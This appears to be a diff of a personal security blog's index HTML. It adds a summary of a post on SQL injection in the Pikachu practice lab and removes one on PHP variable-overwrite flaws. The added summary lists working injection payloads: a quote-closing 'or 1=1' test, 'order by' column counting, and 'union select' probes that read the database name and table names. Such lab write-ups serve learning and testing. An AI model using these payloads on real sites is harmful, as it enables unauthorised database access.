@@ -367,6 +367,49 @@ height:50vh;
     
     
     <article class="index-post">
+        <a class="abstract-title" href = "/article/58c90f3a.html" >
+            
+                <span>Pikachu-SQL注入(二)</span>
+        </a>
+        <div class="abstract-content">
+            Pikachu-SQL注入(二)xx型注入先用1’进行测试，返回所以我们不难猜测，在和后台交互的SQL注入语句中，参数的闭合方式为(‘$id’)我们构造如下语句进行测试，发现返回正常
+11&#39;) or 1&#x3D;1#
+可以判断我们的猜想正确
+由之前的可知字段数为2
+11&#39;) order by 2#
+回显点
+11&#39;) union select 1,2#
+
+数据库名
+11&#39;) union select 1,database()#
+
+表名、列名
+11&#39;) union select 1,group_concat(table_name) from info...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/24</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class= abstract-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Pikachu">Pikachu</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "SQL注入">SQL注入</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href = "/article/4357daed.html" >
             
                 <span>Pikachu-SQL注入</span>
@@ -677,43 +720,6 @@ admin
         <a class="post-tag" href="javascript:void(0);" data-tags = "Pikachu">Pikachu</a>
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "越权">越权</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href = "/article/197506f.html" >
-            
-                <span>代码审计 | 变量覆盖</span>
-        </a>
-        <div class="abstract-content">
-            代码审计 | 变量覆盖什么是变量覆盖漏洞？用户自定义传入的变量可以将代码中原有变量的数值进行覆盖修改
-变量覆盖的常见情况
-$$/foreach()函数使用不当
-extract()函数使用不当
-parse_str()函数使用不当
-import_request_variables()使用不当，开启了全局变量注册
-
-$$使用不当导致变量覆盖漏洞$$，这种写法称为可变变量，一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。
-1234567&lt;?php$a = "hello";echo "$a";              //输出hello$a="world";echo "$a";...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/24</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class= abstract-tags >
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags = "代码审计">代码审计</a>
     
 </div>
             
@@ -1150,9 +1156,24 @@ $$使用不当导致变量覆盖漏洞$$，这种写法称为可变变量，一�
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 25
+        Total : 26
         </div>
         <!-- search  -->
         
@@ -1165,6 +1186,11 @@ $$使用不当导致变量覆盖漏洞$$，这种写法称为可变变量，一�
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/article/f63c4da7.html" >ひとり</a>
+        </li>
     
     
         <li class="archive-post-item">
